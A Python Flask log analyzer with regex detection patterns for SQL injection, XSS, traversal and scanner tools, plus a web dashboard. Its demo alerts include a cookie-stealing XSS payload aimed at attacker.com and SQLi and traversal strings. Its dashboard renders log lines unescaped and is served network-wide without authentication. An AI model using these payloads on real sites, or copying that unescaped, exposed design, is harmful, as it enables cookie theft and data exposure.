#!/usr/bin/env python3
"""
LogHunter - Real-time Security Log Analyzer
Author: vr26patel
GitHub: github.com/vr26patel
Description: Analyzes Linux system logs for attack patterns and displays
             results on a live web dashboard anyone can access
"""

# ============================================================
# IMPORTS - tools we need
# ============================================================
from flask import Flask, render_template_string, jsonify  # web framework
import re          # regular expressions - for pattern matching in logs
import os          # operating system - for checking if files exist
import datetime    # for timestamps
import threading   # for running log watcher in background
import time        # for sleep/timing

# ============================================================
# FLASK APP - this creates our web application
# Flask is like a mini web server you run yourself
# ============================================================
app = Flask(__name__)

# ============================================================
# ATTACK PATTERNS
# These are the patterns LogHunter looks for in log files
# re.compile() converts text patterns into search patterns
# ============================================================
PATTERNS = {
    # SSH brute force - too many failed passwords
    "SSH Brute Force": {
        "pattern": re.compile(r"Failed password|authentication failure|Invalid user", re.IGNORECASE),
        "severity": "critical",
        "log_file": "/var/log/auth.log",
        "description": "Multiple failed SSH login attempts detected - possible brute force attack"
    },

    # SQL Injection in web logs - attacker trying SQLi
    "SQL Injection Attempt": {
        "pattern": re.compile(r"union.*select|drop.*table|insert.*into|or.*1.*=.*1|'.*or.*'|sleep\(\d+\)|benchmark\(", re.IGNORECASE),
        "severity": "critical",
        "log_file": "/var/log/apache2/access.log",
        "description": "SQL injection payload detected in HTTP request"
    },

    # XSS in web logs - attacker trying cross site scripting
    "XSS Attempt": {
        "pattern": re.compile(r"<script|javascript:|onerror=|onload=|alert\(|document\.cookie", re.IGNORECASE),
        "severity": "critical",
        "log_file": "/var/log/apache2/access.log",
        "description": "Cross-site scripting payload detected in HTTP request"
    },

    # Directory traversal - attacker trying to access system files
    "Directory Traversal": {
        "pattern": re.compile(r"\.\./|\.\.\\|%2e%2e|%252e%252e", re.IGNORECASE),
        "severity": "high",
        "log_file": "/var/log/apache2/access.log",
        "description": "Directory traversal attempt detected - attacker trying to access system files"
    },

    # Scanner detected - Nmap, Nikto, SQLmap signatures
    "Security Scanner Detected": {
        "pattern": re.compile(r"nmap|nikto|sqlmap|masscan|gobuster|dirbuster|burpsuite|w3af", re.IGNORECASE),
        "severity": "high",
        "log_file": "/var/log/apache2/access.log",
        "description": "Known security scanning tool detected in user agent or request"
    },

    # Sudo abuse - someone trying to escalate privileges
    "Privilege Escalation Attempt": {
        "pattern": re.compile(r"sudo.*FAILED|sudo.*not allowed|permission denied.*sudo", re.IGNORECASE),
        "severity": "high",
        "log_file": "/var/log/auth.log",
        "description": "Failed sudo attempt - possible privilege escalation attack"
    },

    # Root login attempt
    "Root Login Attempt": {
        "pattern": re.compile(r"ROOT LOGIN|root.*ssh|ssh.*root", re.IGNORECASE),
        "severity": "high",
        "log_file": "/var/log/auth.log",
        "description": "Direct root login attempt detected over SSH"
    },

    # 404 flood - directory enumeration like Gobuster
    "Directory Enumeration": {
        "pattern": re.compile(r'" 404 .*(admin|backup|config|\.git|setup|install|phpmyadmin)', re.IGNORECASE),
        "severity": "medium",
        "log_file": "/var/log/apache2/access.log",
        "description": "Rapid 404 errors on sensitive paths - possible directory enumeration"
    }
}

# ============================================================
# ALERTS LIST
# Every time LogHunter finds something suspicious
# it adds it to this list. The dashboard reads from this list.
# ============================================================
alerts = []
stats = {
    "total": 0,
    "critical": 0,
    "high": 0,
    "medium": 0,
    "scanned_lines": 0
}

# ============================================================
# LOG ANALYZER FUNCTION
# This is the core of LogHunter
# It reads log files and checks each line for attack patterns
# ============================================================
def analyze_logs():
    """
    Reads all log files and checks each line against attack patterns.
    When a match is found, adds it to the alerts list.
    """
    global stats

    # Check each attack pattern
    for attack_name, config in PATTERNS.items():
        log_file = config["log_file"]

        # Check if the log file exists on this machine
        if not os.path.exists(log_file):
            continue  # skip if file doesn't exist

        try:
            with open(log_file, "r", errors="ignore") as f:
                lines = f.readlines()

            # Check each line in the log file
            for line_num, line in enumerate(lines, 1):
                stats["scanned_lines"] += 1

                # Does this line match our attack pattern?
                if config["pattern"].search(line):

                    # Extract IP address from the line if possible
                    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
                    ip = ip_match.group() if ip_match else "Unknown"

                    # Create an alert object
                    alert = {
                        "id": len(alerts) + 1,
                        "type": attack_name,
                        "severity": config["severity"],
                        "description": config["description"],
                        "ip": ip,
                        "log_file": log_file,
                        "line_number": line_num,
                        "raw_log": line.strip()[:200],  # first 200 chars
                        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }

                    # Only add if not already in alerts (avoid duplicates)
                    existing = [a for a in alerts if a["raw_log"] == alert["raw_log"]]
                    if not existing:
                        alerts.append(alert)
                        stats["total"] += 1
                        stats[config["severity"]] += 1

        except PermissionError:
            # Some log files need sudo to read
            # Add an informational alert about this
            alert = {
                "id": len(alerts) + 1,
                "type": "Permission Error",
                "severity": "medium",
                "description": f"Cannot read {log_file} - run LogHunter with sudo for full access",
                "ip": "N/A",
                "log_file": log_file,
                "line_number": 0,
                "raw_log": f"Permission denied: {log_file}",
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            if not any(a["raw_log"] == alert["raw_log"] for a in alerts):
                alerts.append(alert)

        except Exception as e:
            pass  # silently skip other errors


def generate_demo_alerts():
    """
    Creates realistic demo alerts when real log files are empty.
    This lets you see how LogHunter works without needing real attacks.
    """
    demo_data = [
        {
            "type": "SSH Brute Force",
            "severity": "critical",
            "ip": "185.220.101.47",
            "description": "Multiple failed SSH login attempts detected - possible brute force attack",
            "raw_log": "Failed password for root from 185.220.101.47 port 54832 ssh2",
            "log_file": "/var/log/auth.log"
        },
        {
            "type": "SQL Injection Attempt",
            "severity": "critical",
            "ip": "103.21.244.0",
            "description": "SQL injection payload detected in HTTP request",
            "raw_log": "GET /login.php?id=1' UNION SELECT user,password FROM users-- HTTP/1.1",
            "log_file": "/var/log/apache2/access.log"
        },
        {
            "type": "XSS Attempt",
            "severity": "critical",
            "ip": "91.108.4.0",
            "description": "Cross-site scripting payload detected in HTTP request",
            "raw_log": "GET /search?q=<script>document.location='http://attacker.com?c='+document.cookie</script>",
            "log_file": "/var/log/apache2/access.log"
        },
        {
            "type": "Security Scanner Detected",
            "severity": "high",
            "ip": "45.33.32.156",
            "description": "Known security scanning tool detected in user agent",
            "raw_log": 'GET /dvwa/ HTTP/1.1" 200 - "sqlmap/1.7.8#stable (https://sqlmap.org)"',
            "log_file": "/var/log/apache2/access.log"
        },
        {
            "type": "Directory Enumeration",
            "severity": "medium",
            "ip": "192.168.1.105",
            "description": "Rapid 404 errors on sensitive paths - possible directory enumeration",
            "raw_log": 'GET /admin HTTP/1.1" 404 - "gobuster/3.1.0"',
            "log_file": "/var/log/apache2/access.log"
        },
        {
            "type": "Directory Traversal",
            "severity": "high",
            "ip": "178.62.0.0",
            "description": "Directory traversal attempt detected",
            "raw_log": "GET /../../../../etc/passwd HTTP/1.1",
            "log_file": "/var/log/apache2/access.log"
        },
        {
            "type": "Privilege Escalation Attempt",
            "severity": "high",
            "ip": "10.0.2.15",
            "description": "Failed sudo attempt - possible privilege escalation",
            "raw_log": "sudo: www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www",
            "log_file": "/var/log/auth.log"
        },
        {
            "type": "Root Login Attempt",
            "severity": "high",
            "ip": "222.186.42.0",
            "description": "Direct root login attempt detected over SSH",
            "raw_log": "Invalid user root from 222.186.42.0 port 44832",
            "log_file": "/var/log/auth.log"
        }
    ]

    for i, data in enumerate(demo_data):
        alert = {
            "id": i + 1,
            "type": data["type"],
            "severity": data["severity"],
            "ip": data["ip"],
            "description": data["description"],
            "log_file": data["log_file"],
            "line_number": i + 100,
            "raw_log": data["raw_log"],
            "timestamp": (datetime.datetime.now() - datetime.timedelta(minutes=i*3)).strftime("%Y-%m-%d %H:%M:%S")
        }
        alerts.append(alert)
        stats["total"] += 1
        if data["severity"] in stats:
            stats[data["severity"]] += 1


# ============================================================
# THE HTML DASHBOARD
# This is the web page users see in their browser
# Everything between the triple quotes is HTML/CSS/JavaScript
# ============================================================
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LogHunter — Security Log Analyzer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; }

        /* TOP HEADER */
        .header {
            background: #161b22;
            border-bottom: 2px solid #e74c3c;
            padding: 16px 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .logo { font-size: 1.5rem; font-weight: bold; color: #e74c3c; }
        .logo span { color: #c9d1d9; font-weight: 300; }
        .status { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #3fb950; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #3fb950; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

        /* STATS CARDS */
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; padding: 24px 32px; }
        .stat-card { background: #161b22; border-radius: 8px; padding: 20px; border: 1px solid #30363d; text-align: center; }
        .stat-card .number { font-size: 2.5rem; font-weight: bold; margin-bottom: 4px; }
        .stat-card .label { font-size: 12px; color: #8b949e; text-transform: uppercase; letter-spacing: .05em; }
        .total .number { color: #58a6ff; }
        .critical .number { color: #e74c3c; }
        .high .number { color: #f39c12; }
        .medium .number { color: #3fb950; }

        /* FILTER BUTTONS */
        .filters { padding: 0 32px 16px; display: flex; gap: 8px; flex-wrap: wrap; }
        .filter-btn {
            padding: 6px 16px; border-radius: 20px; font-size: 12px; cursor: pointer;
            border: 1px solid #30363d; background: #21262d; color: #8b949e;
            transition: all .15s;
        }
        .filter-btn:hover, .filter-btn.active { background: #e74c3c; color: white; border-color: #e74c3c; }

        /* ALERTS TABLE */
        .alerts-section { padding: 0 32px 32px; }
        .section-title { font-size: 14px; font-weight: 500; color: #8b949e; margin-bottom: 12px; text-transform: uppercase; letter-spacing: .05em; }
        .alert-card {
            background: #161b22; border-radius: 8px; padding: 16px;
            margin-bottom: 10px; border: 1px solid #30363d;
            border-left: 4px solid #30363d;
            transition: border-color .15s;
            animation: slideIn .3s ease;
        }
        @keyframes slideIn { from { opacity:0; transform:translateY(-10px); } to { opacity:1; transform:translateY(0); } }
        .alert-card.critical { border-left-color: #e74c3c; }
        .alert-card.high { border-left-color: #f39c12; }
        .alert-card.medium { border-left-color: #3fb950; }
        .alert-card:hover { border-color: #58a6ff; }

        .alert-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
        .alert-type { font-size: 14px; font-weight: 500; color: #c9d1d9; }
        .badge {
            padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: bold;
        }
        .badge.critical { background: #3d1111; color: #e74c3c; }
        .badge.high { background: #3d2611; color: #f39c12; }
        .badge.medium { background: #11331a; color: #3fb950; }

        .alert-desc { font-size: 13px; color: #8b949e; margin-bottom: 8px; }
        .alert-meta { display: flex; gap: 16px; flex-wrap: wrap; }
        .meta-item { font-size: 12px; color: #6e7681; }
        .meta-item span { color: #58a6ff; }

        .raw-log {
            margin-top: 10px; padding: 8px 12px;
            background: #0d1117; border-radius: 4px;
            font-family: 'Courier New', monospace; font-size: 11px;
            color: #3fb950; word-break: break-all;
            border: 1px solid #21262d;
        }

        .empty-state { text-align: center; padding: 60px; color: #8b949e; }
        .empty-state .icon { font-size: 48px; margin-bottom: 16px; }

        /* REFRESH BUTTON */
        .refresh-btn {
            padding: 8px 20px; background: #e74c3c; color: white;
            border: none; border-radius: 6px; cursor: pointer; font-size: 13px;
        }
        .refresh-btn:hover { background: #c0392b; }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="header">
        <div class="logo">Log<span>Hunter</span> 🎯</div>
        <div style="display:flex;gap:16px;align-items:center;">
            <div class="status">
                <div class="dot"></div>
                <span id="last-update">Scanning...</span>
            </div>
            <button class="refresh-btn" onclick="loadAlerts()">Refresh</button>
        </div>
    </div>

    <!-- STATS CARDS -->
    <div class="stats">
        <div class="stat-card total">
            <div class="number" id="total-count">0</div>
            <div class="label">Total Alerts</div>
        </div>
        <div class="stat-card critical">
            <div class="number" id="critical-count">0</div>
            <div class="label">Critical</div>
        </div>
        <div class="stat-card high">
            <div class="number" id="high-count">0</div>
            <div class="label">High</div>
        </div>
        <div class="stat-card medium">
            <div class="number" id="medium-count">0</div>
            <div class="label">Medium</div>
        </div>
    </div>

    <!-- FILTER BUTTONS -->
    <div class="filters">
        <button class="filter-btn active" onclick="filterAlerts('all', this)">All</button>
        <button class="filter-btn" onclick="filterAlerts('critical', this)">Critical</button>
        <button class="filter-btn" onclick="filterAlerts('high', this)">High</button>
        <button class="filter-btn" onclick="filterAlerts('medium', this)">Medium</button>
        <button class="filter-btn" onclick="filterAlerts('SSH Brute Force', this)">SSH Brute Force</button>
        <button class="filter-btn" onclick="filterAlerts('SQL Injection', this)">SQL Injection</button>
        <button class="filter-btn" onclick="filterAlerts('XSS', this)">XSS</button>
        <button class="filter-btn" onclick="filterAlerts('Scanner', this)">Scanners</button>
    </div>

    <!-- ALERTS LIST -->
    <div class="alerts-section">
        <div class="section-title">Security Alerts</div>
        <div id="alerts-container">
            <div class="empty-state">
                <div class="icon">🔍</div>
                <p>Loading alerts...</p>
            </div>
        </div>
    </div>

    <!-- JAVASCRIPT - makes the page dynamic -->
    <script>
        let allAlerts = [];
        let currentFilter = 'all';

        // Load alerts from the Python backend
        function loadAlerts() {
            fetch('/api/alerts')
                .then(response => response.json())
                .then(data => {
                    allAlerts = data.alerts;

                    // Update stat cards
                    document.getElementById('total-count').textContent = data.stats.total;
                    document.getElementById('critical-count').textContent = data.stats.critical;
                    document.getElementById('high-count').textContent = data.stats.high;
                    document.getElementById('medium-count').textContent = data.stats.medium || 0;

                    // Update last scan time
                    document.getElementById('last-update').textContent =
                        'Last scan: ' + new Date().toLocaleTimeString();

                    // Display alerts
                    displayAlerts(allAlerts);
                });
        }

        // Filter alerts by type or severity
        function filterAlerts(filter, btn) {
            currentFilter = filter;

            // Update active button
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            // Filter the alerts
            let filtered = allAlerts;
            if (filter !== 'all') {
                filtered = allAlerts.filter(a =>
                    a.severity === filter ||
                    a.type.toLowerCase().includes(filter.toLowerCase())
                );
            }

            displayAlerts(filtered);
        }

        // Display alerts in the container
        function displayAlerts(alertList) {
            const container = document.getElementById('alerts-container');

            if (alertList.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="icon">✅</div>
                        <p>No alerts found for this filter</p>
                    </div>`;
                return;
            }

            // Build HTML for each alert
            container.innerHTML = alertList.map(alert => `
                <div class="alert-card ${alert.severity}">
                    <div class="alert-header">
                        <div class="alert-type">${alert.type}</div>
                        <span class="badge ${alert.severity}">${alert.severity.toUpperCase()}</span>
                    </div>
                    <div class="alert-desc">${alert.description}</div>
                    <div class="alert-meta">
                        <div class="meta-item">IP: <span>${alert.ip}</span></div>
                        <div class="meta-item">File: <span>${alert.log_file}</span></div>
                        <div class="meta-item">Line: <span>${alert.line_number}</span></div>
                        <div class="meta-item">Time: <span>${alert.timestamp}</span></div>
                    </div>
                    <div class="raw-log">${alert.raw_log}</div>
                </div>
            `).join('');
        }

        // Auto refresh every 30 seconds
        loadAlerts();
        setInterval(loadAlerts, 30000);
    </script>

</body>
</html>
"""

# ============================================================
# FLASK ROUTES
# Routes are URLs. When someone visits a URL, Flask runs
# the function below it and returns the result.
# ============================================================

@app.route('/')
def dashboard():
    """
    When someone visits http://localhost:5000/
    Flask runs this function and returns the HTML dashboard
    """
    return render_template_string(DASHBOARD_HTML)


@app.route('/api/alerts')
def get_alerts():
    """
    When the JavaScript fetches /api/alerts
    Flask returns all alerts as JSON data
    JSON is a data format JavaScript can read easily
    """
    return jsonify({
        "alerts": alerts,
        "stats": stats
    })


@app.route('/api/scan')
def trigger_scan():
    """
    Triggers a fresh log scan
    The dashboard can call this to get new results
    """
    analyze_logs()
    return jsonify({"status": "scan complete", "total": len(alerts)})


# ============================================================
# BACKGROUND SCANNER
# This runs analyze_logs() every 60 seconds automatically
# So the dashboard always shows fresh data
# ============================================================
def background_scanner():
    """
    Runs in a separate thread so it doesn't block the web server
    A thread is like a separate worker running at the same time
    """
    while True:
        analyze_logs()
        time.sleep(60)  # wait 60 seconds then scan again


# ============================================================
# MAIN - starts everything
# ============================================================
if __name__ == "__main__":
    print("""
    ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗███╗  ██╗████████╗███████╗██████╗
    ██║     ██╔═══██╗██╔════╝ ██║  ██║██║   ██║████╗ ██║╚══██╔══╝██╔════╝██╔══██╗
    ██║     ██║   ██║██║  ███╗███████║██║   ██║██╔██╗██║   ██║   █████╗  ██████╔╝
    ██║     ██║   ██║██║   ██║██╔══██║██║   ██║██║╚████║   ██║   ██╔══╝  ██╔══██╗
    ███████╗╚██████╔╝╚██████╔╝██║  ██║╚██████╔╝██║ ╚███║   ██║   ███████╗██║  ██║
    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    """)
    print("    Real-time Security Log Analyzer")
    print("    github.com/vr26patel/LogHunter")
    print("")
    print("    [*] Scanning log files...")

    # First scan when starting up
    analyze_logs()

    # If no real logs found, use demo data
    if len(alerts) == 0:
        print("    [*] No real log data found — loading demo alerts")
        generate_demo_alerts()
    else:
        print(f"    [+] Found {len(alerts)} alerts in real log files")

    print(f"    [+] Total alerts: {stats['total']}")
    print("")
    print("    [*] Starting web server...")
    print("    [+] Dashboard: http://localhost:5000")
    print("    [+] Anyone on your network can access: http://YOUR-IP:5000")
    print("")
    print("    [!] Press Ctrl+C to stop")
    print("")

    # Start background scanner in separate thread
    scanner_thread = threading.Thread(target=background_scanner, daemon=True)
    scanner_thread.start()

    # Start Flask web server
    # host='0.0.0.0' means anyone on the network can access it
    # not just localhost
    app.run(host='0.0.0.0', port=5000, debug=False)
